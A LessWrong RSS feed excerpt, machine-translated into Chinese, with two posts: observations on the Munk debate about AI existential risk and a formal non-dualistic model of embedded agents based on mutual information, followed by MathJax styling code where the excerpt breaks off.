<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:dc="http://purl.org/dc/elements/1.1/"><channel><title><![CDATA[LessWrong]]></title><description><![CDATA[A community blog devoted to refining the art of rationality]]></description><link/> https://www.lesswrong.com<image/><url> https://res.cloudinary.com/lesswrong-2-0/image/upload/v1497915096/favicon_lncumn.ico</url><title>少错</title><link/>https://www.lesswrong.com<generator>节点的 RSS</generator><lastbuilddate> 2023 年 11 月 10 日星期五 02:22:01 GMT </lastbuilddate><atom:link href="https://www.lesswrong.com/feed.xml?view=rss&amp;karmaThreshold=2" rel="self" type="application/rss+xml"></atom:link><item><title><![CDATA[Munk Debate on AI: a few observations and opinions]]></title><description><![CDATA[Published on November 10, 2023 2:00 AM GMT<br/><br/><p><i>之前在 LessWrong 中介绍过</i><a href="https://www.lesswrong.com/posts/LNwtnZ7MGTmeifkz3/munk-ai-debate-confusions-and-possible-cruxes"><i>这里</i></a><i>、</i> <a href="https://www.lesswrong.com/posts/CA7iLZHNT5xbLK59Y/did-bengio-and-tegmark-lose-a-debate-about-ai-x-risk-against"><i>这里</i></a><i>和</i><a href="https://www.lesswrong.com/posts/qsDPHZwjmduSMCJLv/the-partial-fallacy-of-dumb-superintelligence"><i>这里</i></a><i>。</i> </p><figure class="media"><div data-oembed-url="https://www.youtube.com/watch?v=144uOfr4SYA"><div><iframe src="https://www.youtube.com/embed/144uOfr4SYA" allow="autoplay; encrypted-media" allowfullscreen=""></iframe></div></div></figure><p><strong>观察#1：</strong>辩论实际上并不是关于命题的——而是对命题的字面解读。 （ <a href="https://en.wikipedia.org/wiki/Max_Tegmark">Max Tegmark</a> ：“我们只是认为风险不是百分之零。” <a href="https://en.wikipedia.org/wiki/Yann_LeCun">Yann LeCun</a> ：“……风险可以忽略不计……”）</p><p><strong>意见#1：</strong>更好的主张可能是这样的：“为了人类，我们应该放慢人工智能能力的研究。”或者，“研究人员应该开源前沿人工智能模型。”</p><hr><p><strong>观察#2：</strong> Yann LeCun 声称人工智能安全是（或应该是）一个经验和迭代的过程。他相信人工智能将逐步从老鼠水平进步到人类水平甚至更高（即不会有快速起飞）。他并不<i>反对</i>人工智能安全本身；他只是反对人工智能安全。他只是提倡采用不同的方法来确保人工智能安全。 （ <a href="https://en.wikipedia.org/wiki/Yoshua_Bengio">Yoshua Bengio</a> ：“有趣的是，你一直在提出安全问题的解决方案，这意味着你相信我们需要构建安全的人工智能。这意味着有一个问题需要解决。”）</p><p><strong>观点#2：</strong> LeCun 在那些非常重视人工智能 x 风险的人中遭到了很多批评。但我不明白为什么他提出的人工智能安全方法是错误的、鲁莽的或误导的。本着这一精神，萨姆·奥尔特曼<a href="https://forum.effectivealtruism.org/posts/vuATadXMheRhBvXfi/sam-altman-safety-and-capabilities-are-not-these-two">最近断言</a>“安全和能力不是这两件独立的事情”。我认为这是一个值得认真考虑的主张。我认为值得思考这一主张对人工智能安全的影响。也许人工智能安全的实证、迭代方法是最现实的前进道路。</p><hr><p><strong>观察#3：</strong><a href="https://en.wikipedia.org/wiki/Melanie_Mitchell">梅兰妮·米切尔（Melanie Mitchell）</a>的中心观点是，超人类的通用人工智能还很遥远，目前还不值得认真对待。 （“我们可以承认人工智能令人难以置信的进步，而无需推断出对新兴超级智能人工智能的毫无根据的猜测。”）这似乎不是 LeCun 的观点。</p><p><strong>意见＃3：（</strong>至少对我来说）如果有第二位辩手站在反对方的立场上，他同意 AGI 可以很容易地变得安全，并且可以为此提供论据，而不是仅仅表达普遍的怀疑，那会更有趣关于 AGI 的近期前景。</p><br/><br/> <a href="https://www.lesswrong.com/posts/Lx4BfG4kjNqxzfbt9/munk-debate-on-ai-a-few-observations-and-opinions#comments">讨论</a>]]>;</description><link/> https://www.lesswrong.com/posts/Lx4BfG4kjNqxzfbt9/munk-debate-on-ai-a-few-observations-and-opinions<guid ispermalink="false"> Lx4BfG4kjNqxzfbt9</guid><dc:creator><![CDATA[Yarrow Bouchard]]></dc:creator><pubDate> Fri, 10 Nov 2023 02:00:56 GMT</pubDate> </item><item><title><![CDATA[ACI#6: A Non-Dualistic ACI Model]]></title><description><![CDATA[Published on November 9, 2023 11:01 PM GMT<br/><br/><p>大多数传统人工智能模型都是二元的。正如<a href="https://www.lesswrong.com/s/Rm6oQRJJmhGCcLvxh/p/i3BTagvt3HbPMx6PN">Demski 和 Garrabrant 所指出的</a>，这些模型假设代理是一个随时间持续存在的对象，并且具有明确定义的输入/输出通道，就像它在玩视频游戏一样。</p><p>然而，在现实世界中，代理嵌入在环境中，代理和环境之间没有明确定义的边界。这就是为什么需要一个非二元模型来描述边界和输入/输出通道如何从更基本的概念中出现。</p><p>例如，在斯科特·加拉布兰特（Scott Garrabrant）的<a href="https://www.lesswrong.com/posts/BSpdshJWGAW6TuNzZ/introduction-to-cartesian-frames"><i>笛卡尔框架</i></a>中，输入和输出可以源自“代理在“代理可能的方式”中自由选择的能力。</p><p>然而，选择仍然是笛卡尔框架的关键概念之一，但从非二元论的角度来看，“甚至不清楚嵌入式智能体选择一个选项意味着什么”，因为嵌入式智能体是“宇宙在戳自己” ”。在非二元模型中形式化选择的想法与形式化自由意志的想法一样困难。</p><p>为了避免依赖“选择”的概念，我们提出了<strong>通用算法通用智能（gACI）</strong>模型，该模型仅从第三人称视角描述嵌入式代理，并在以事件为中心的框架中使用互信息来衡量代理的行为。</p><p> gACI 模型并不试图回答“代理应该做什么？”的问题。相反，它侧重于描述主体-环境边界的出现，并回答“为什么个体感觉自己在选择？”的问题。</p><p>在决策理论的语言中，gACI属于描述性决策理论而不是规范性决策理论。</p><p></p><h2><strong>沟通渠道和互信息</strong></h2><p>在二元智能模型中，智能体从环境中接收<strong>输入</strong>信息，并通过<strong>输出</strong>动作来操纵环境。但现实世界的代理嵌入在环境中，将信息交换限制在清晰的输入/输出通道并不容易。</p><p>另一方面，在gACI模型中，输入/输出信道是通信信道，其中发送方和接收方之间的信息传输通过<strong>互信息</strong>来测量。 </p><p></p><p><img src="https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/FRd6nNj3M33w2CSX5/fv0swt2m94bctlwpgrpj" srcset="https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/FRd6nNj3M33w2CSX5/lpkjtoj84pu9z2tcmztu 150w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/FRd6nNj3M33w2CSX5/dyzvjguu0l5ojlmzds6i 300w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/FRd6nNj3M33w2CSX5/eug8w6vqahli2kkqqsyv 450w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/FRd6nNj3M33w2CSX5/kzz2ijsxk7hbnwyq6wqb 600w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/FRd6nNj3M33w2CSX5/iizlpd4qt74hckytqqah 750w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/FRd6nNj3M33w2CSX5/eazgyyfppdisqxy1ufdf 900w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/FRd6nNj3M33w2CSX5/my6bunbnhpzgg0efhnsf 1050w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/FRd6nNj3M33w2CSX5/ef2vcilpubwaljavidpx 1200w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/FRd6nNj3M33w2CSX5/dywgnfnxwftveb8kmtqg 1350w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/FRd6nNj3M33w2CSX5/bqx3diq5o1pgkdbdutnw 1500w"><br><i>图 1：从二元输入/输出模型到互信息模型。</i></p><p></p><p>我们可以轻松地定义任意两个对象的状态之间的互信息，而无需指定信息如何传输，或者谁是发送者，谁是接收者，或者传输介质是什么，或者它们是直接连接还是间接连接。</p><p>这两个对象可以是世界的任何部分，例如代理、环境，或者代理或环境的任何部分，如果需要，可以在任何地方绘制其边界。它们甚至可以重叠。</p><p>拥有相互信息并不总是意味着了解或理解，但它提供了了解或理解的上限。</p><p>利用两个物体的相互信息，我们可以定义记忆和预言。</p><p></p><h2><strong>记忆与预言</strong></h2><p><strong>记忆</strong>是关于过去的信息，或者是将关于过去的信息传输到未来的通信通道（ <a href="https://drive.google.com/file/d/1t_npcCLGVO3Dr01sDVxd_KDp0xDv-yi2/view">Gershman 2021</a> ）。如果A是接收者，B是发送者，我们可以定义：A对B的记忆是A的当前状态和B的过去状态之间的互信息：</p><p> <span><span class="mjpage"><span class="mjx-chtml"><span class="mjx-math" aria-label="M(A,B,t)=I(A(t_0);B(t)), &nbsp; t<t_0"><span class="mjx-mrow" aria-hidden="true"><span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.446em; padding-bottom: 0.298em; padding-right: 0.081em;">M</span></span> <span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.446em; padding-bottom: 0.593em;">(</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.519em; padding-bottom: 0.298em;">A</span></span> <span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="margin-top: -0.144em; padding-bottom: 0.519em;">,</span></span> <span class="mjx-mi MJXc-space1"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.446em; padding-bottom: 0.298em;">B</span></span> <span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="margin-top: -0.144em; padding-bottom: 0.519em;">,</span></span> <span class="mjx-mi MJXc-space1"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.372em; padding-bottom: 0.298em;">t</span></span> <span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.446em; padding-bottom: 0.593em;">)</span></span> <span class="mjx-mo MJXc-space3"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.077em; padding-bottom: 0.298em;">=</span></span> <span class="mjx-mi MJXc-space3"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.446em; padding-bottom: 0.298em; padding-right: 0.064em;">I</span></span> <span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.446em; padding-bottom: 0.593em;">(</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.519em; padding-bottom: 0.298em;">A</span></span> <span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.446em; padding-bottom: 0.593em;">(</span></span> <span class="mjx-msubsup"><span class="mjx-base"><span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.372em; padding-bottom: 0.298em;">t</span></span></span> <span class="mjx-sub" style="font-size: 70.7%; vertical-align: -0.212em; padding-right: 0.071em;"><span class="mjx-mn" style=""><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.372em; padding-bottom: 0.372em;">0</span></span></span></span> <span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.446em; padding-bottom: 0.593em;">)</span></span> <span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.151em; padding-bottom: 0.519em;">;</span></span> <span class="mjx-mi MJXc-space1"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.446em; padding-bottom: 0.298em;">B</span></span> <span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.446em; padding-bottom: 0.593em;">(</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.372em; padding-bottom: 0.298em;">t</span></span> <span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.446em; padding-bottom: 0.593em;">)</span></span> <span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.446em; padding-bottom: 0.593em;">)</span></span> <span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="margin-top: -0.144em; padding-bottom: 0.519em;">,</span></span> <span class="mjx-mi MJXc-space1"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.372em; padding-bottom: 0.298em;">t</span></span> <span class="mjx-mo MJXc-space3"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.225em; padding-bottom: 0.372em;">&lt;</span></span> <span class="mjx-msubsup MJXc-space3"><span class="mjx-base"><span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.372em; padding-bottom: 0.298em;">t</span></span></span> <span class="mjx-sub" style="font-size: 70.7%; vertical-align: -0.212em; padding-right: 0.071em;"><span class="mjx-mn" style=""><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.372em; padding-bottom: 0.372em;">0</span></span></span></span></span></span></span></span></span> <style>.mjx-chtml {display: inline-block; line-height: 0; text-indent: 0; text-align: left; text-transform: none; font-style: normal; font-weight: normal; font-size: 100%; font-size-adjust: none; letter-spacing: normal; word-wrap: normal; word-spacing: normal; white-space: nowrap; float: none; direction: ltr; max-width: none; max-height: none; min-width: 0; min-height: 0; border: 0; margin: 0; padding: 1px 0}
.MJXc-display {display: block; text-align: center; margin: 1em 0; padding: 0}
.mjx-chtml[tabindex]:focus, body :focus .mjx-chtml[tabindex] {display: inline-table}
.mjx-full-width {text-align: center; display: table-cell!important; width: 10000em}
.mjx-math {display: inline-block; border-collapse: separate; border-spacing: 0}
.mjx-math * {display: inline-block; -webkit-box-sizing: content-box!important; -moz-box-sizing: content-box!important; box-sizing: content-box!important; text-align: left}
.mjx-numerator {display: block; text-align: center}
.mjx-denominator {display: block; text-align: center}
.MJXc-stacked {height: 0; position: relative}
.MJXc-stacked > * {position: absolute}
.MJXc-bevelled > * {display: inline-block}
.mjx-stack {display: inline-block}
.mjx-op {display: block}
.mjx-under {display: table-cell}
.mjx-over {display: block}
.mjx-over > * {padding-left: 0px!important; padding-right: 0px!important}
.mjx-under > * {padding-left: 0px!important; padding-right: 0px!important}
.mjx-stack > .mjx-sup {display: block}
.mjx-stack > .mjx-sub {display: block}
.mjx-prestack > .mjx-presup {display: block}
.mjx-prestack > .mjx-presub {display: block}
.mjx-delim-h > .mjx-char {display: inline-block}
.mjx-surd {vertical-align: top}
.mjx-surd + .mjx-box {display: inline-flex}
.mjx-mphantom * {visibility: hidden}
.mjx-merror {background-color: #FFFF88; color: #CC0000; border: 1px solid #CC0000; padding: 2px 3px; font-style: normal; font-size: 90%}
.mjx-annotation-xml {line-height: normal}
.mjx-menclose > svg {fill: none; stroke: currentColor; overflow: visible}
.mjx-mtr {display: table-row}
.mjx-mlabeledtr {display: table-row}
.mjx-mtd {display: table-cell; text-align: center}
.mjx-label {display: table-row}
.mjx-box {display: inline-block}
.mjx-block {display: block}
.mjx-span {display: inline}
.mjx-char {display: block; white-space: pre}
.mjx-itable {display: inline-table; width: auto}
.mjx-row {display: table-row}
.mjx-cell {display: table-cell}
.mjx-table {display: table; width: 100%}
.mjx-line {display: block; height: 0}
.mjx-strut {width: 0; padding-top: 1em}
.mjx-vsize {width: 0}
.MJXc-space1 {margin-left: .167em}
.MJXc-space2 {margin-left: .222em}
.MJXc-space3 {margin-left: .278em}
.mjx-test.mjx-test-display {display: table!important}
.mjx-test.mjx-test-inline {display: inline!important; margin-right: -1px}
.mjx-test.mjx-test-default {display: block!important; clear: both}
.mjx-ex-box {display: inline-block!important; position: absolute; overflow: hidden; min-height: 0; max-height: none; padding: 0; border: 0; margin: 0; width: 1px; height: 60ex}
.mjx-test-inline .mjx-left-box {display: inline-block; width: 0; float: left}
.mjx-test-inline .mjx-right-box {display: inline-block; width: 0; float: right}
.mjx-test-display .mjx-right-box {display: table-cell!important; width: 10000em!important; min-width: 0; max-width: none; padding: 0; border: 0; margin: 0}
.MJXc-TeX-unknown-R {font-family: monospace; font-style: normal; font-weight: normal}
.MJXc-TeX-unknown-I {font-family: monospace; font-style: italic; font-weight: normal}
.MJXc-TeX-unknown-B {font-family: monospace; font-style: normal; font-weight: bold}
.MJXc-TeX-unknown-BI {font-family: monospace; font-style: italic; font-weight: bold}
.MJXc-TeX-ams-R {font-family: MJXc-TeX-ams-R,MJXc-TeX-ams-Rw}
.MJXc-TeX-cal-B {font-family: MJXc-TeX-cal-B,MJXc-TeX-cal-Bx,MJXc-TeX-cal-Bw}
.MJXc-TeX-frak-R {font-family: MJXc-TeX-frak-R,MJXc-TeX-frak-Rw}
.MJXc-TeX-frak-B {font-family: MJXc-TeX-frak-B,MJXc-TeX-frak-Bx,MJXc-TeX-frak-Bw}
.MJXc-TeX-math-BI {font-family: MJXc-TeX-math-BI,MJXc-TeX-math-BIx,MJXc-TeX-math-BIw}
.MJXc-TeX-sans-R {font-family: MJXc-TeX-sans-R,MJXc-TeX-sans-Rw}
.MJXc-TeX-sans-B {font-family: MJXc-TeX-sans-B,MJXc-TeX-sans-Bx,MJXc-TeX-sans-Bw}
.MJXc-TeX-sans-I {font-family: MJXc-TeX-sans-I,MJXc-TeX-sans-Ix,MJXc-TeX-sans-Iw}
.MJXc-TeX-script-R {font-family: MJXc-TeX-script-R,MJXc-TeX-script-Rw}
.MJXc-TeX-type-R {font-family: MJXc-TeX-type-R,MJXc-TeX-type-Rw}
.MJXc-TeX-cal-R {font-family: MJXc-TeX-cal-R,MJXc-TeX-cal-Rw}
.MJXc-TeX-main-B {font-family: MJXc-TeX-main-B,MJXc-TeX-main-Bx,MJXc-TeX-main-Bw}
.MJXc-TeX-main-I {font-family: MJXc-TeX-main-I,MJXc-TeX-main-Ix,MJXc-TeX-main-Iw}
.MJXc-TeX-main-R {font-family: MJXc-TeX-main-R,MJXc-TeX-main-Rw}
.MJXc-TeX-math-I {font-family: MJXc-TeX-math-I,MJXc-TeX-math-Ix,MJXc-TeX-math-Iw}
.MJXc-TeX-size1-R {font-family: MJXc-TeX-size1-R,MJXc-TeX-size1-Rw}
.MJXc-TeX-size2-R {font-family: MJXc-TeX-size2-R,MJXc-TeX-size2-Rw}
.MJXc-TeX-size3-R {font-family: MJXc-TeX-size3-R,MJXc-TeX-size3-Rw}
.MJXc-TeX-size4-R {font-family: MJXc-TeX-size4-R,MJXc-TeX-size4-Rw}
.MJXc-TeX-vec-R {font-family: MJXc-TeX-vec-R,MJXc-TeX-vec-Rw}
.MJXc-TeX-vec-B {font-family: MJXc-TeX-vec-B,MJXc-TeX-vec-Bx,MJXc-TeX-vec-Bw}
@font-face {font-family: MJXc-TeX-ams-R; src: local('MathJax_AMS'), local('MathJax_AMS-Regular')}
@font-face {font-family: MJXc-TeX-ams-Rw; src /*1*/: url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/eot/MathJax_AMS-Regular.eot'); src /*2*/: url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/woff/MathJax_AMS-Regular.woff') format('woff'), url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/otf/MathJax_AMS-Regular.otf') format('opentype')}
@font-face {font-family: MJXc-TeX-cal-B; src: local('MathJax_Caligraphic Bold'), local('MathJax_Caligraphic-Bold')}
@font-face {font-family: MJXc-TeX-cal-Bx; src: local('MathJax_Caligraphic'); font-weight: bold}
@font-face {font-family: MJXc-TeX-cal-Bw; src /*1*/: url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/eot/MathJax_Caligraphic-Bold.eot'); src /*2*/: url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/woff/MathJax_Caligraphic-Bold.woff') format('woff'), url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/otf/MathJax_Caligraphic-Bold.otf') format('opentype')}
@font-face {font-family: MJXc-TeX-frak-R; src: local('MathJax_Fraktur'), local('MathJax_Fraktur-Regular')}
@font-face {font-family: MJXc-TeX-frak-Rw; src /*1*/: url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/eot/MathJax_Fraktur-Regular.eot'); src /*2*/: url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/woff/MathJax_Fraktur-Regular.woff') format('woff'), url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/otf/MathJax_Fraktur-Regular.otf') format('opentype')}
@font-face {font-family: MJXc-TeX-frak-B; src: local('MathJax_Fraktur Bold'), local('MathJax_Fraktur-Bold')}
@font-face {font-family: MJXc-TeX-frak-Bx; src: local('MathJax_Fraktur'); font-weight: bold}
@font-face {font-family: MJXc-TeX-frak-Bw; src /*1*/: url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/eot/MathJax_Fraktur-Bold.eot'); src /*2*/: url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/woff/MathJax_Fraktur-Bold.woff') format('woff'), url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/otf/MathJax_Fraktur-Bold.otf') format('opentype')}
@font-face {font-family: MJXc-TeX-math-BI; src: local('MathJax_Math BoldItalic'), local('MathJax_Math-BoldItalic')}
@font-face {font-family: MJXc-TeX-math-BIx; src: local('MathJax_Math'); font-weight: bold; font-style: italic}
@font-face {font-family: MJXc-TeX-math-BIw; src /*1*/: url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/eot/MathJax_Math-BoldItalic.eot'); src /*2*/: url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/woff/MathJax_Math-BoldItalic.woff') format('woff'), url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/otf/MathJax_Math-BoldItalic.otf') format('opentype')}
@font-face {font-family: MJXc-TeX-sans-R; src: local('MathJax_SansSerif'), local('MathJax_SansSerif-Regular')}
@font-face {font-family: MJXc-TeX-sans-Rw; src /*1*/: url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/eot/MathJax_SansSerif-Regular.eot'); src /*2*/: url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/woff/MathJax_SansSerif-Regular.woff') format('woff'), url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/otf/MathJax_SansSerif-Regular.otf') format('opentype')}
@font-face {font-family: MJXc-TeX-sans-B; src: local('MathJax_SansSerif Bold'), local('MathJax_SansSerif-Bold')}
@font-face {font-family: MJXc-TeX-sans-Bx; src: local('MathJax_SansSerif'); font-weight: bold}
@font-face {font-family: MJXc-TeX-sans-Bw; src /*1*/: url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/eot/MathJax_SansSerif-Bold.eot'); src /*2*/: url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/woff/MathJax_SansSerif-Bold.woff') format('woff'), url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/otf/MathJax_SansSerif-Bold.otf') format('opentype')}
@font-face {font-family: MJXc-TeX-sans-I; src: local('MathJax_SansSerif Italic'), local('MathJax_SansSerif-Italic')}
@font-face {font-family: MJXc-TeX-sans-Ix; src: local('MathJax_SansSerif'); font-style: italic}
@font-face {font-family: MJXc-TeX-sans-Iw; src /*1*/: url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/eot/MathJax_SansSerif-Italic.eot'); src /*2*/: url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/woff/MathJax_SansSerif-Italic.woff') format('woff'), url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/otf/MathJax_SansSerif-Italic.otf') format('opentype')}
@font-face {font-family: MJXc-TeX-script-R; src: local('MathJax_Script'), local('MathJax_Script-Regular')}
@font-face {font-family: MJXc-TeX-script-Rw; src /*1*/: url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/eot/MathJax_Script-Regular.eot'); src /*2*/: url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/woff/MathJax_Script-Regular.woff') format('woff'), url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/otf/MathJax_Script-Regular.otf') format('opentype')}
@font-face {font-family: MJXc-TeX-type-R; src: local('MathJax_Typewriter'), local('MathJax_Typewriter-Regular')}
@font-face {font-family: MJXc-TeX-type-Rw; src /*1*/: url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/eot/MathJax_Typewriter-Regular.eot'); src /*2*/: url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/woff/MathJax_Typewriter-Regular.woff') format('woff'), url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/otf/MathJax_Typewriter-Regular.otf') format('opentype')}
@font-face {font-family: MJXc-TeX-cal-R; src: local('MathJax_Caligraphic'), local('MathJax_Caligraphic-Regular')}
@font-face {font-family: MJXc-TeX-cal-Rw; src /*1*/: url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/eot/MathJax_Caligraphic-Regular.eot'); src /*2*/: url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/woff/MathJax_Caligraphic-Regular.woff') format('woff'), url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/otf/MathJax_Caligraphic-Regular.otf') format('opentype')}
@font-face {font-family: MJXc-TeX-main-B; src: local('MathJax_Main Bold'), local('MathJax_Main-Bold')}
@font-face {font-family: MJXc-TeX-main-Bx; src: local('MathJax_Main'); font-weight: bold}
@font-face {font-family: MJXc-TeX-main-Bw; src /*1*/: url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/eot/MathJax_Main-Bold.eot'); src /*2*/: url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/woff/MathJax_Main-Bold.woff') format('woff'), url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/otf/MathJax_Main-Bold.otf') format('opentype')}
@font-face {font-family: MJXc-TeX-main-I; src: local('MathJax_Main Italic'), local('MathJax_Main-Italic')}
@font-face {font-family: MJXc-TeX-main-Ix; src: local('MathJax_Main'); font-style: italic}
@font-face {font-family: MJXc-TeX-main-Iw; src /*1*/: url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/eot/MathJax_Main-Italic.eot'); src /*2*/: url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/woff/MathJax_Main-Italic.woff') format('woff'), url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/otf/MathJax_Main-Italic.otf') format('opentype')}
@font-face {font-family: MJXc-TeX-main-R; src: local('MathJax_Main'), local('MathJax_Main-Regular')}
@font-face {font-family: MJXc-TeX-main-Rw; src /*1*/: url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/eot/MathJax_Main-Regular.eot'); src /*2*/: url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/woff/MathJax_Main-Regular.woff') format('woff'), url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/otf/MathJax_Main-Regular.otf') format('opentype')}
@font-face {font-family: MJXc-TeX-math-I; src: local('MathJax_Math Italic'), local('MathJax_Math-Italic')}
@font-face {font-family: MJXc-TeX-math-Ix; src: local('MathJax_Math'); font-style: italic}
@font-face {font-family: MJXc-TeX-math-Iw; src /*1*/: url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/eot/MathJax_Math-Italic.eot'); src /*2*/: url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/woff/MathJax_Math-Italic.woff') format('woff'), url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/otf/MathJax_Math-Italic.otf') format('opentype')}
@font-face {font-family: MJXc-TeX-size1-R; src: local('MathJax_Size1'), local('MathJax_Size1-Regular')}
